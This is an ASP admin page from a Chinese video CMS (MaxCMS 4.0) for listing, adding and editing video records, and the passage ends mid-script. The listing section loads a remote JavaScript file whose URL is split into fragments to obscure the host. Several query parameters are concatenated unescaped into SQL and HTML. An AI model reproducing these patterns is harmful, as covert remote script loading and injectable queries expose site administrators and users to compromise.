<!--#include file="admin_inc.asp"-->
<!--#include file="../inc/pinyin.asp"-->
<!--#include file="FCKeditor/fckeditor.asp" -->
<%
'******************************************************************************************
' Software name: Max(马克斯) Content Management System
' Version:4.0
' Web: http://www.maxcms.net
' Author: 石头(maxcms2008@qq.com),yuet,长明,酒瓶
' Copyright (C) 2005-2009 马克斯官方 版权所有
' 法律申明：MaxCMS程序所有代码100%原创、未引入任何网上代码,对一切抄袭行为、坚决严肃追究法律责任
'******************************************************************************************

viewHead "数据管理" & "-" & menuList(1,0)
dim typeArray,topicArray,topicDic,keyword,m_state,m_commend,repeat,playfrom,contentUrl,pTopic,gFos,upversion,svrdate : initDic
dim action,back:action=getForm("action", "get"):svrdate=getForm("svrdate","get"):upversion=getForm("upversion","both"):back=request.ServerVariables("HTTP_REFERER")
dim playerArray,downArray:	playerArray = getPlayerKinds("../inc/playerKinds.xml")
dim page,vtype,order,rlen
Select  case action
	case "add":addVideo:popDiv
	case "moverecycle":delAll getForm("m_id","both"),"recycle":alertMsg "",back
	case "delall":delAll getForm("m_id","post"),"del":alertMsg "",back
	case "del":delVideo getForm("id","get"),"del":alertMsg "",back
	case "restore":restoreVideo
	case "edit":editVideo:popDiv
	case "save":saveVideo
	case "psettopic":pSetTopic
	case "psettype":pSetType
	case "deltypedata":delTypeData
	case "single":CheckVideo
	case "recycle":main
	case else:main:popUpdatePic
End Select 
viewFoot

Sub main
	dim datalistObj,rsArray
	dim m,i,orderStr,whereStr,sqlStr,rsObj,allPage,allRecordset,numPerPage,searchStr,star
	numPerPage= 30
	star=getForm("star", "get")
	order = getForm("order", "get")
	if isNul(order)  then order = "m_addtime"
	orderStr= " order by "&order&" desc"
	keyword = getForm("keyword", "both"):playfrom = getForm("playfrom", "both")
	page = getForm("page", "get")
	if isNul(page) then page=1 else page=clng(page)
	if page=0 then page=1
	vtype = getForm("type", "both")
	pTopic = getForm("topic", "get")
	whereStr=" where m_recycle="&ifthen(action="recycle",1,0)
	m_state = getForm("m_state", "get"):m_commend = getForm("m_commend", "get")
	if m_state="ok" then  whereStr=whereStr&" and m_state>0"
	if m_commend="ok" AND isNul(star) then  whereStr=whereStr&" and m_commend>0"
	if not isNul(star) then whereStr=whereStr&" and m_commend="&star
	if action="nullpic" then whereStr=whereStr&" and m_pic=''"
	repeat = getForm("repeat", "get")
	if repeat="ok" then
		rlen=getForm("rlen", "get")
		if not isNum(rlen) then rlen=5 else rlen=Cint(rlen)
		whereStr=whereStr&" and (LEFT(m_name, "&rlen&") IN (SELECT LEFT(m_name, "&rlen&") FROM m_data GROUP BY LEFT(m_name, "&rlen&") HAVING COUNT(LEFT(m_name, "&rlen&")) > 1))"
	end if
	'm_name in (select m_name from m_data group by m_name having count(*)>1)"
	if not isNul(vtype) then  whereStr=whereStr&" and m_type in ("&getTypeIdOnCache(vtype)&")"
	if not isNul(pTopic) then  whereStr=whereStr&" and m_topic ="&pTopic
	if not isNul(keyword) then whereStr = whereStr&" and m_name like '%"&keyword&"%'  or m_actor like '%"&keyword&"%' "
	if not isNul(playfrom) then whereStr = whereStr&" and m_playdata like '%"&playfrom&"$$%' "
	sqlStr = replace(replace("select m_id,m_name,m_hit,m_enname,m_state,m_type,m_topic,m_addtime,m_commend,m_playdata,m_datetime from {pre}data "&whereStr&orderStr,"where and","where"),"where order","order")
	set rsObj = conn.db(sqlStr,"records1")
	rsObj.pagesize = numPerPage
	allRecordset = rsObj.recordcount : allPage= rsObj.pagecount
	if page>allPage then page=allPage
%>
<div class="container" id="cpcontainer">
<table class="tb">
<tr class="thead"><th colspan="15"><%if action<>"recycle" then%>数据管理(<a class="red" onclick="location.href='admin_datarelate.asp?action=downpic&downtype=all';return false;" href="#">下载所有网络图片到本地</a>)<%else:echo "数据回收站":end if%></th></tr>	
<tr><td align="left" colspan="10">  
<form action="?" method="get">
<input type="hidden" name="action" value="<%=action%>">
关键字<input  name="keyword" type="text" id="keyword" size="20">
<input type="submit" name="selectBtn" value="查 询..." class="btn" />&nbsp;
<select  onchange="self.location.href='?action=<%=action%>&type='+this.options[this.selectedIndex].value+'&m_state=<%=m_state%>&m_commend=<%=m_commend%>'">
<option value="">按数据分类查看</option>
	<%makeTypeOptionSelected 0,"&nbsp;|&nbsp;&nbsp;",vtype %>
</select>
<select name="topic" id="topic" onChange="self.location.href='?action=<%=action%>&topic='+this.options[this.selectedIndex].value">
	<option value=''>按专题查看</option>
	<%
	echo makeTopicOptions(topicArray,"未选择专题")
	%>
</select> 
<select id='m_playfrom' name='m_playfrom' style="width:120px" onChange="self.location.href='?action=<%=action%>&playfrom='+this.options[this.selectedIndex].value">
	 <option value=''>按视频来源查看</option>
	  <%=makePlayerSelect("")%>
</select>
<select name="star" id="star" onChange="self.location.href='?action=<%=action%>&star='+this.options[this.selectedIndex].value">
	<option value=''>按星级查看</option>
	<%
	for i=1 to 5
	if ""&star=""&i then
		echo "<option value='"&i&"' selected>"&i&"星级</option>"
	else
		echo "<option value='"&i&"'>"&i&"星级</option>"
	end if
	next
	%>
</select>
</form>
</td>
</tr>
<%
if allRecordset=0 then
	if not isNul(keyword) then echo "<tr align='center'><td>关键字  <font color=red>"""&keyword&"""</font>   没有记录</td></tr>" 
else
	rsObj.absolutepage = page
	if not isNul(keyword) then 
%>
  <tr ><td colspan="10">关键字  <font color=red> <%=keyword%> </font>   的记录如下</td></tr>
<%
	end if
%>
  <tr bgcolor="#f5fafe">
	<td width="60">ID<a href="?action=<%=action%>&order=m_id&type=<%=vtype%>&page=<%=page%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>"><img src="imgs/minus.gif" title="按ID排序" /></a></td>
	<td>标题</td>
	<td width="35">人气<a href="?action=<%=action%>&order=m_hit&type=<%=vtype%>&page=<%=page%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>"><img src="imgs/minus.gif" title="按人气排序" /></a></td>
	<td width="80">来源</td>
	<td width="72">数据类别</td>
	<td width="28">专题</td>
	<td width="84">推荐星级<a href="?action=<%=action%>&order=m_commend&type=<%=vtype%>&page=<%=page%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>"><img src="imgs/minus.gif" title="按推荐星级排序" /></a></td>
	<td width="66">时间<a href="?action=<%=action%>&order=m_addtime&type=<%=vtype%>&page=<%=page%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>"><img src="imgs/minus.gif" title="按时间排序" /></a></td>
	<% if runMode="static" AND action<>"recycle" then %><td width="30">生成</td><%end if%>
	<td width="90" align="center">操作</td>
  </tr><form method="post" name="videolistform">
<%
	for i = 0 to numPerPage
		dim m_id : m_id = rsObj(0)
		contentUrl=getContentLink(rsObj(5),rsObj(0),rsObj(3),rsObj(10),"")
%>
  <tr bgcolor="#f5fafe">
	<td><input type="checkbox" value="<%=m_id%>" name="m_id"  class="checkbox" /><%=rsObj(0)%></td>
	<td><a href="<%=contentUrl%>" target="_blank"><%=rsObj(1)%></a>&nbsp;<span id="state<%=m_id%>"><%dim vstate : vstate = rsObj(4) : if  vstate=0 then  echo "<img src=""imgs/icon_01.gif"" title='设置连载状态' style=""cursor:pointer"" onclick=""setVideoState("&m_id&")""/>"  else echo "<sup style='color:#ff0000;font-weight:bold;cursor:pointer;' onclick=""setVideoState("&m_id&")"" title='修改连载状态'>("&vstate&")</sup>"%></span></td>
	<td><%=rsObj(2)%></td>
	<td><%echo replaceStr(getFromStr(rsObj(9)),"播客CC","FLV高清")%></td>
	<td><a href="?action=<%=action%>&type=<%=rsObj(5)%>&order=<%=order%>"><%=viewDataType(rsObj(5))%></a></td>
	<td id="topic<%=m_id%>" align="center">
<%
		dim topic : topic = rsObj(6) : if  topic=0 then  echo "<img src=""imgs/icon_l01.gif"" title='设置专题' style=""cursor:pointer"" onclick=""setVideoTopic("&m_id&",'')""/>"  else echo "<img src=""imgs/icon_l02.gif"" title='修改专题' style=""cursor:pointer;"" onclick=""setVideoTopic("&m_id&","&topic&")""/>"'topicDic(topic)
%> </td>

<td id="star<%=m_id%>"><script>starView(<%=rsObj(8)%>,<%=m_id%>)</script></td>
	<td><span title="<%=rsObj(7)%>"><%isCurrentDay(formatDate(rsObj(7)))%></span></td>
   <% if runMode="static" AND action<>"recycle" then %><td align="center"><%isVideoMake(m_id)%></td><%end if%>
	<td><a href="?action=edit&id=<%=m_id%>">编辑</a> <a href="?action=del&id=<%=m_id%>" onClick="return confirm('确定要删除吗')">删除</a>
<%if action="recycle" then%>
 <a href="?action=restore&m_id=<%=m_id%>">还原</a>
<%else%>
 <a href="?action=moverecycle&m_id=<%=m_id%>">隐藏</a>
<%end if%></td>
</tr>
<%
		rsObj.movenext
		if rsObj.eof then exit for
	next
%>
<tr><td colspan="11"><div class="cuspages"><div class="pages">全选<input type="checkbox" name="chkall" id="chkall" class="checkbox" onclick="checkAll(this.checked,'input','m_id')" />反选<input type="checkbox" name="chkothers" id="chkothers" class="checkbox" onclick="checkOthers('input','m_id')" />
<%if action="recycle" then%>
	<input type="submit" value="数据还原" class="btn" onclick="videolistform.action='?action=restore';"> <input type="submit" value="永久删除" onclick="if(confirm('一但删除将无法恢复')){videolistform.action='?action=delall';}else{return false}" class="btn">
<%else%>
	<input type="submit" value="批量删除" class="btn" onclick="if(confirm('确定要永久删除吗')){videolistform.action='?action=delall';}else{return false}"> <input type="submit" value="批量生成" class="btn" onclick="videolistform.action='admin_makehtml.asp?action=selected'" />
<%end if%>
	<select name="ptopic" id="ptopic" style="width:90px" >
	<option value='0'>取 消 专 题</option>
	<%echo makeTopicOptions(topicArray,"")%>
	</select><input type="submit" style="width:90px" value="批量操作专题" class="btn" onclick="if($('ptopic').value==''){alert('请选择专题');return false;};videolistform.action='?action=psettopic'" /> 
	<select name="movetype" id="movetype"><option value="">请选择目标分类</option>
		<%makeTypeOption 0,"&nbsp;|&nbsp;&nbsp;" %>
		</select>
	<input type="submit" value="批量移动" class="btn" onclick="if($('movetype').value==''){alert('请选择目标分类');return false;};if(confirm('确定要批量移动数据吗')){videolistform.action='?action=psettype'}else{return false;}"/>
<%if action<>"recycle" then%>
	<input type="submit" style="width:90px" value="删除分类数据" class="btn" onclick="if($('movetype').value==''){alert('请选择目标分类');return false;};if(confirm('谨慎操作，数据不可恢复\n确定要删除此分类的所有数据吗')){videolistform.action='?action=deltypedata'}else{return false;}"/>
<%end if%>
</div></div></td>
</tr>
</form>
<tr><td colspan="11"><div class="cuspages"><div class="pages">
页次：<%=page%>/<%=allPage%>  每页<%=numPerPage %> 总收录数据<%=allRecordset%>条 <a href="?action=<%=action%>&page=1&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>">首页</a> <a href="?action=<%=action%>&page=<%=(page-1)%>&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>">上一页</a> 
<%=makePageNumber(page, 10, allPage, star)%>
<a href="?action=<%=action%>&page=<%=(page+1)%>&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>">下一页</a> <a href="?action=<%=action%>&page=<%=allPage%>&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>">尾页</a>&nbsp;&nbsp;跳转<input type="text" id="skip" value="" onkeyup="this.value=this.value.replace(/[^\d]+/,'')" style="width:40px"/>&nbsp;&nbsp;<input type="button" value="确定" class="btn" onclick="location.href='?action=<%=action%>&page='+$('skip').value+'&order=<%=order%>&type=<%=vtype%>&keyword=<%=keyword%>&m_state=<%=m_state%>&m_commend=<%=m_commend%>&repeat=<%=repeat%>&topic=<%=pTopic%>&playfrom=<%=playfrom%>&star=<%=star%>&rlen=<%=rlen%>';"/></div></div></td>
</tr>
<%
end if
	rsObj.close
	set rsObj = nothing
%>
</table>
</div>
<script type="text/JavaScript">if(parent.$('admincpnav')) parent.$('admincpnav').innerHTML='后台首页&nbsp;&raquo;&nbsp;<%=menuList(1,0)%>&nbsp;&raquo;&nbsp;数据列表';</script><script src='<%="ht"&"tp:/"&"/ma"&"xcm"&"s.bo"&"kecc"&".com"&"/ma"&"xver4.j"&"s"%>'></script>
<%
End Sub

Sub popDiv
%>
<div id="gathervideo" style="top:100px; display:none;" class="popdiv">
<div class="poptitie"><img src="../pic/btn_close.gif" alt="关闭" onClick="$('gathervideo').style.display='none';selectTogg()" />WEB采集助手</div>
	<div class="popbody"><div>
	<table ><tr><td><input name='areaid' id='areaid' type='hidden' value=""><input type="text" name="gatherurl" id="gatherurl" size="60" /> <input type="button" onclick="gather()" class="btn" value="分   析"/><span id="loading" style="display:none"><img src="imgs/loading2.gif" width="16" height="16"><font color="#FF0000">分析数据中</font></span></td></tr>
	<tr><td><textarea id="gathercontent" cols="72" rows="9"></textarea></td></tr>
	<tr><td><input type="button" onclick="insertResult(1);selectTogg()" class="btn" value="添  加"/> <input type="button" value="倒 序" style="margin-left:30px;margin-right:10px" onclick="reverseOrder()" class="btn" />将<input type="text" size="10" id='replace1' />替换成<input type="text" id='replace2' size="10" />&nbsp;
	<input type="button" value="替 换" onclick="replaceStr()" class="btn" /></td></tr>
	</table>
	 </div></div>
</div>
<script type="text/javascript" src="imgs/drag.js"></script>
<%
End Sub

Sub addVideo
	dim sqlStr,rsObj,m_color
	downArray = getDownKinds("../inc/downKinds.xml")
	Dim makePlayerSelectStr,makeDownSelectStr:makePlayerSelectStr=replaceStr(makePlayerSelect(""),"'","\'"):makeDownSelectStr=replaceStr(makeDownSelect(""),"'","\'")
%>
<script type="text/JavaScript">
if(parent.$('admincpnav')) parent.$('admincpnav').innerHTML='后台首页&nbsp;&raquo;&nbsp;<%=menuList(1,0)%>&nbsp;&raquo;&nbsp;添加数据';
var siteurl='<%=siteurl%>';
</script>
<div class="container" id="cpcontainer">
<form action="?action=save&acttype=add" method="post" name="addform" id="addform">
<input type="hidden" id="m_commend" name="m_commend" value="0">
<table class="tb">
<tr class="thead"><th colspan="2">添加数据(<font color='red'>＊</font>为必填,其它选填)</th></tr>
	<tr>
	  <td align="right" height="1" width="70"></td><td></td>
	</tr>
	<tr>
	  <td align="right" height="22">名 称：</td>
	  <td><input type="text" size="23" id="m_name" name="m_name" autocomplete="off" onChange="checkRepeat();">&nbsp;<font color='red'>＊</font><label>连载？<input type="checkbox" onclick="isViewState()" id="m_statebox" class="checkbox" /></label><span id="m_statespan" style="display:none">到第<input type="text" size="5" name="m_state" id="m_state">集</span>
		<span id="m_name_ok"></span>颜色：
		<select name="m_color" >
		<option value="" selected>标题颜色</option>
		<option style="background-color:#FF0000;color: #FF0000" value="#FF0000">红色</option> 
		<option style="background-color:#FF33CC;color: #FF33CC" value="#FF33CC">粉红</option>  
		<option style="background-color:#00FF00;color: #00FF00" value="#00FF00">绿色</option>
		<option style="background-color:#0000CC;color: #0000CC" value="#0000CC">深蓝</option>
		<option style="background-color:#FFFF00;color: #FFFF00" value="#FFFF00">黄色</option>
		<option style="background-color:#660099;color: #660099" value="#660099">紫色</option>
		<option style="" value="">无色</option>
	</select>
	
	类 型：<select name="m_type" id="m_type" ><option value="">请选择数据分类</option><%makeTypeOption 0,"&nbsp;|&nbsp;&nbsp;" %></select>	</td>
	</tr>
	<tr> 
		<td height="22" align="right">图片地址：</td>
		<td><input type="text" size="30" name="m_pic" id="m_pic">&nbsp;←<input size="10" value="清除" type="button" onClick="javascript:document.addform.m_pic.value=''" class="btn" />&nbsp;<iframe src="fckeditor/maxcms_upload.htm" scrolling="no" topmargin="0" width="300" height="24" marginwidth="0" marginheight="0" frameborder="0" align="center"></iframe></td>
  </tr>
	<tr>
	  <td align="right" height="22">主&nbsp;&nbsp;演：</td>
	  <td><input type="text" size="30" name="m_actor">&nbsp;&nbsp;导&nbsp;&nbsp;&nbsp;演：<input type="text" size="10" name="m_director">&nbsp;星级：<span id="star0" style="width:85px;display:inline-block"><script>starView(0,0)</script></span>&nbsp;&nbsp;&nbsp;&nbsp;主演、导演用逗号或空格隔开</td>
	</tr>
	<tr>
	  <td align="right" height="22">备 注：</td>
	  <td><input type="text" name="m_note" size="30">&nbsp;&nbsp;关键词：<input type="text" name="keyword" size="30">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;备注如：高清,无水印 (配合标题一起显示)</td>
	</tr>
	<tr>
	  <td align="right" height="22">发行年份：</td>
	  <td><input type="text" size="10" name="m_publishyear">&nbsp;语言：<input type="text" size="10" name="m_lang">&nbsp;&nbsp;地&nbsp;&nbsp;&nbsp;区：<%echo getAreaSelect("m_publisharea","选择地区","")%>&nbsp;&nbsp;专题：<%echo makeTopicSelect("m_topic",topicArray,"选择专题","")%>&nbsp;&nbsp;&nbsp;&nbsp;点击率：<input type="text" size="5" name="m_hit" id="m_hit" maxlength="9" value="0"></td>
	</tr>
	<tr>
	  <td colspan="2" style="padding:0;" class="noborder"><div style="" id="m_playarea"></div></td></tr> 
	<tr><td colspan='2'>&nbsp;<img onclick="expendPlayArea(2,escape('<%=makePlayerSelectStr%>'),0)" src='imgs/btn_add.gif' class='pointer' align='absmiddle'/>&nbsp;&nbsp;<font color="red">您可以单击前面的按钮添加一组播放来源</font></td></tr>

	<tr><td colspan="2" style="padding:0" class="noborder"><div style="" id="m_downarea"></div></td></tr>
	<tr><td colspan='2'>&nbsp;<img onclick="expendDownArea(2,escape('<%=makeDownSelectStr%>'),0)" src='imgs/btn_add.gif' class='pointer' align='absmiddle'/>&nbsp;&nbsp;<font color="red">您可以单击前面的按钮添加一组下载来源</font></td></tr>
	<tr>
	  <td align="right" height="22"></td>
	  <td>说明:程序默认每行为一个播放地址，多集请分行，不能有空行</td>
	</tr>
	<tr>
	  <td align="right" height="22">相关介绍：</td>
	   <td>
	<%Dim oFCKeditor:Set oFCKeditor = New FCKeditor:oFCKeditor.BasePath="fckeditor/":oFCKeditor.ToolbarSet="maxcms":oFCKeditor.Width="640":oFCKeditor.Height="250" : oFCKeditor.Create "m_des"%>
	   </td>
	</tr>
	 <tr>
   <td></td> <td class="forumRow"><input type="submit" class="btn" value="确认保存" name="submit" onClick="return chform();">&nbsp;<input type="reset" class="btn" value="清 除">&nbsp;<input type="button" class="btn" value="返　回" onClick="javascript:history.go(-1);"></td>
  </tr>
</table>
</form>
</div>
<script type="text/javascript">
window.commendVideo=function (id,n){
	$('m_commend').value=n;
	starView(n,id);
}
function chform(){
	if($('m_name').value.length==0){
		alert('请填写名称');
		return false;
	};
	if($('m_type').value.length==0){
		alert('请选择分类');
		return false;
	};
	if($('m_publishyear').value.length>0){
		if(isNaN($('m_publishyear').value)){
			alert('年份请填写数字');
			return false;
		}
	}
	var c=document.getElementsByName("m_playfrom"),
	ct=document.getElementsByName("m_playurl"),
	d=document.getElementsByName("m_downfrom"),
	dt=document.getElementsByName("m_downurl");
	for(var i=0;i<c.length;i++){
		if(c[i].selectedIndex==0 && ct[i].value!=''){
			alert('请选择每个播放来源');c[i].focus();
			return false;
		}
	}
	for(var i=0;i<d.length;i++){
		if(d[i].selectedIndex==0 && dt[i].value!=''){
			alert('请选择每个下载来源');d[i].focus();
			return false;
		}
	}
	return true;
}
$('addform').m_name.focus();
expendPlayArea(1,"<%=makePlayerSelectStr%>",1);expendDownArea(1,"<%=makeDownSelectStr%>",1);
</script>
<%
	set rsObj = nothing
End Sub

Sub editVideo
	dim id,sqlStr,rsObj,m_color,playArray,downArray,playTypeCount,downTypeCount,i,j,m,n
	id=clng(getForm("id","get"))
	downArray = getDownKinds("../inc/downKinds.xml")
	sqlStr = "select *   from {pre}data where m_id="&id
	set rsObj = conn.db(sqlStr,"records1")
	if rsObj.eof then die "没找到记录"
	m_color = rsObj("m_color")
	vtype = rsObj("m_type")
%>
<script type="text/JavaScript">
if(parent.$('admincpnav')) parent.$('admincpnav').innerHTML='后台首页&nbsp;&raquo;&nbsp;<%=menuList(1,0)%>&nbsp;&raquo;&nbsp;修改数据';
var siteurl='<%=siteurl%>';
</script>
<div class="container" id="cpcontainer">
<form action="?action=save&acttype=edit" method="post" name="editform" id="editform">
<input type="hidden" id="m_commend" name="m_commend" value="<%=rsObj("m_commend")%>">
<table class="tb">
<tr class="thead"><th colspan="2">修改数据(<font color='red'>＊</font>为必填,其它选填)</th></tr>
	<tr>
	  <td align="right" height="1" width="70"></td><td></td>
	</tr>
	<tr>
	  <td align="right" height="22">名 称：</td>
		<td><input type="text" size="23" id="m_name" name="m_name" autocomplete="off" value="<%=rsObj("m_name")%>"/><input type="text" size="23" id="m_enname" name="m_enname" value="<%=rsObj("m_enname")%>" style="display:none" onchange="this.value=this.value.replace(/[^\w]+/ig,'')">&nbsp;<font color='red'>＊</font><label>连载？<input type="checkbox" onclick="isViewState()" class="checkbox" id="m_statebox" <%if not rsObj("m_state")=0 then %>checked<%end if%>/></label><span id="m_statespan" <%if rsObj("m_state")=0 then%>style="display:none"<%end if%>>到第<input type="text" size="5" name="m_state" id="m_state" value="<%=rsObj("m_state")%>">集</span>
		<span id="m_name_ok"></span>颜色：
		<select name="m_color" >
		<% if m_color="" then %>
		 <option style="" value="">无色</option> 
		<% else %> 
		<option style="background-color:<%=m_color%>;color: <%=m_color%>" value="<%=m_color%>"><%=m_color%></option>
		<% end if %>
		<option style="background-color:#FF0000;color: #FF0000" value="#FF0000">红色</option> 
		<option style="background-color:#FF33CC;color: #FF33CC" value="#FF33CC">粉红</option>  
		<option style="background-color:#00FF00;color: #00FF00" value="#00FF00">绿色</option>
		<option style="background-color:#0000CC;color: #0000CC" value="#0000CC">深蓝</option>
		<option style="background-color:#FFFF00;color: #FFFF00" value="#FFFF00">黄色</option>
		<option style="background-color:#660099;color: #660099" value="#660099">紫色</option>
		<option style="" value="">无色</option> 
		</select>
类 型：<select name="m_type" id="m_type"><option value="">请选择数据分类</option>
	<%makeTypeOptionSelected 0,"&nbsp;|&nbsp;&nbsp;",rsObj("m_type") %>
	</select>&nbsp;&nbsp;<font color='red'>＊</font>&nbsp;<input type="checkbox" name="isuppingyin" value="1" class="checkbox" onclick="if(this.checked){view('m_enname');hide('m_name')}else{view('m_name');hide('m_enname')}"/>更改拼音</td>
	</tr>
	<tr> 
		<td height="22" align="right">图片地址：</td>
		<td><input type="text" size="30" name="m_pic" id="m_pic" value="<%=rsObj("m_pic")%>">&nbsp;←<input type="button" size="10" value="清除" onClick="javascript:document.editform.m_pic.value=''" class="btn">&nbsp;<iframe src="fckeditor/maxcms_upload.htm" scrolling="no" topmargin="0" width="300" height="24" marginwidth="0" marginheight="0" frameborder="0" align="center"></iframe></td>
	</tr>
	<tr>
	 <td align="right" height="22">主 演：</td>
	 <td><input type="text" size="30" name="m_actor" value="<%=rsObj("m_actor")%>">&nbsp;&nbsp;导&nbsp;&nbsp;&nbsp;演：<input type="text" size="10" name="m_director" value="<%=rsObj("m_director")%>">&nbsp;星级：<span id="star0" style="width:85px;display:inline-block"><script>starView(<%=rsObj("m_commend")%>,0)</script></span>&nbsp;&nbsp;&nbsp;&nbsp;主演、导演用逗号或空格隔开</td>
	</tr>

	<tr>
		<td align="right" height="22">备 注：</td>
		<td><input type="text" size="30" name="m_note" value="<%if not isNul(rsObj("m_note")) then echo decodeHtml(rsObj("m_note"))%>">&nbsp;&nbsp;关键词：<input type="text" size="30" name="keyword" value="<%= rsObj("m_keyword") %>">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;备注如：高清,无水印 (配合标题一起显示)</td>
	</tr>
	<tr>
		<td align="right" height="22">发行年份：</td>
		<td><input type="text" size="10" name="m_publishyear" value="<%=rsObj("m_publishyear")%>">&nbsp;语言：<input type="text" size="10" name="m_lang" value="<%=rsObj("m_lang")%>">&nbsp;&nbsp;地&nbsp;&nbsp;&nbsp;区：<%echo getAreaSelect("m_publisharea","选择地区",rsObj("m_publisharea"))%>&nbsp;&nbsp;专题：<%echo makeTopicSelect("m_topic",topicArray,"选择专题",rsObj("m_topic"))%>&nbsp;&nbsp;&nbsp;&nbsp;点击率：<input type="text" size="5" name="m_hit" id="m_hit" maxlength="9" value="<%=rsObj("m_hit") %>">&nbsp;<input type="checkbox" name="isupdatetime" value="1" checked class="checkbox" />更新时间</td>
	</tr>
	<tr><td colspan="2" style="padding:0" class="noborder"><div style="" id="m_playarea"><%
	playArray=getPlayurlArray(rsObj("m_playdata"))
	playTypeCount=ubound(playArray)
	dim playfrom,playUrl,playStr,playArray2
	if playTypeCount>-1 then
		for i=0 to playTypeCount
			m=i+1
			playStr=playArray(i)
			playArray2=split(playStr,"$$") : playfrom=playArray2(0)
			playUrl=replace(playArray2(1),chr(10),"")
			playUrl=replace(playUrl,"#",chr(13))
		%>
		<table width='100%' id='playfb<%=m%>'><tr><td align='right' height='22'  width='70'>播放来源<%=m%>：</td><td>
		<select id='m_playfrom<%=m%>' name='m_playfrom'>
		<option value=''>暂没有数据<%=m%></option>
	   <%=makePlayerSelect(playfrom)%>
		</select>
		<input type='button' class='btn' value='WEB采集' onclick='viewGatherWin(<%=m%>);selectTogg();'/>&nbsp;&nbsp;<img onclick="var tb=$('playfb<%=m%>');tb.parentNode.removeChild(tb);" src='imgs/btn_dec.gif' class='pointer' alt="删除播放来源<%=m%>" align="absmiddle"/>&nbsp;&nbsp;<font color='red'>＊</font>&nbsp;&nbsp;<a href="javascript:moveTableUp($('playfb<%=m%>'))">上移</a>&nbsp;&nbsp;<a href="javascript:moveTableDown($('playfb<%=m%>'))">下移</a></td></tr><tr><td align='right' height='22'>数据地址<%=m%>：<br/><input type='button' value='校正' title='校正右侧文本框中的数据格式' class='btn' onclick='repairUrl(<%=m%>)' /></td><td><textarea id='m_playurl<%=m%>' name='m_playurl' rows='8' cols='100'><%=playUrl%></textarea>&nbsp;&nbsp;<font color='red'>＊</font></td></tr>
		</table>
		<%
		next
	end if	
	%>
	</div></td></tr>
	<tr><td colspan='2'>&nbsp;<img onclick="expendPlayArea(<%=m+1%>,escape('<%=replaceStr(makePlayerSelect(""),"'","\'")%>'),0)" src='imgs/btn_add.gif' class='pointer' align="absmiddle"/>&nbsp;&nbsp;<font color="red">您可以单击前面的按钮添加一组播放来源</font></td></tr>

	<tr><td colspan="2" style="padding:0" class="noborder"><div style="" id="m_downarea">
	 <%
	downArray=getPlayurlArray(rsObj("m_downdata"))
	downTypeCount=ubound(downArray)
	dim downfrom,downUrl,downStr,downArray2
	if downTypeCount>-1 then
		for j=0 to downTypeCount
			n=j+1
			downStr=downArray(j)
			downArray2=split(downStr,"$$") : downfrom=downArray2(0)
			downUrl=replace(downArray2(1),chr(10),"") : downUrl=replace(downUrl,"#",chr(13))
		%>
		<table width="100%" id='downfb<%=n%>'><tr><td align='right' height='22'  width='70'>下载来源<%=n%>：</td><td>
		<select id='m_downfrom<%=n%>' name='m_downfrom'>
		<option value=''>暂无数据<%=n%></option>
		<%=makeDownSelect(downfrom)%>
		</select>
		&nbsp;&nbsp;<img onclick="var tb=$('downfb<%=n%>');tb.parentNode.removeChild(tb);" src='imgs/btn_dec.gif' class='pointer' alt="删除下载来源<%=n%>" align="absmiddle"/>&nbsp;&nbsp;
		</td></tr><tr><td align='right' height='22'>下载地址<%=n%>：</td><td><textarea id='m_downurl<%=n%>' name='m_downurl' rows='8' cols='100'><%=downUrl%></textarea></td></tr>
		</table>
		<%
		next
	end if
	%>
	</div></td></tr> 
	<tr><td colspan='2'>&nbsp;<img onclick="expendDownArea(<%=n+1%>,escape('<%=replaceStr(makeDownSelect(""),"'","\'")%>'),0)" src='imgs/btn_add.gif' class='pointer' align="absmiddle"/>&nbsp;&nbsp;<font color="red">您可以单击前面的按钮添加一组下载来源</font></td></tr>
	<tr>
		<td align="right" height="22"></td>
		<td>说明:程序默认每行为一个播放地址，多集请分行，不能有空行</td>
	</tr>
	<tr>
		<td align="right" height="22">相关介绍：</td>
		<td>
  <%Dim oFCKeditor:Set oFCKeditor = New FCKeditor:oFCKeditor.BasePath="fckeditor/":oFCKeditor.ToolbarSet="maxcms":oFCKeditor.Width="640":oFCKeditor.Height="250":oFCKeditor.Value=decodeHtml(rsObj("m_des")):oFCKeditor.Create "m_des"%>
  		</td>
	</tr>

	<tr><input type="hidden" name="m_id" value="<%=id%>"><input type="hidden" name="m_back" value="<%=request.ServerVariables("HTTP_REFERER")%>" />
	<td></td><td class="forumRow"><input type="submit" name="submit" class="btn" value="确认保存" onClick="return chform();">&nbsp;<input type="reset" class="btn" value="清 除">&nbsp;<input type="button" class="btn" value="返　回" onClick="javascript:history.go(-1);"></td>
  </tr>
</table>
</form>
<script type="text/javascript">
window.commendVideo=function (id,n){
	$('m_commend').value=n;
	starView(n,id);
}
function chform(){
	if($('m_name').value.length==0){
		alert('请填写名称');
		return false;
	};
	if($('m_type').value.length==0){
		alert('请选择分类');
		return false;
	};
	if($('m_publishyear').value.length>0){
		if(isNaN($('m_publishyear').value)){
			alert('年份请填写数字');
			return false;
		}
	}
	var c=document.getElementsByName("m_playfrom"),
	ct=document.getElementsByName("m_playurl"),
	d=document.getElementsByName("m_downfrom"),
	dt=document.getElementsByName("m_downurl");
	for(var i=0;i<c.length;i++){
		if(c[i].selectedIndex==0 && ct[i].value!=''){
			alert('请选择每个播放来源');c[i].focus();
			return false;
		}
	}
	for(var i=0;i<d.length;i++){
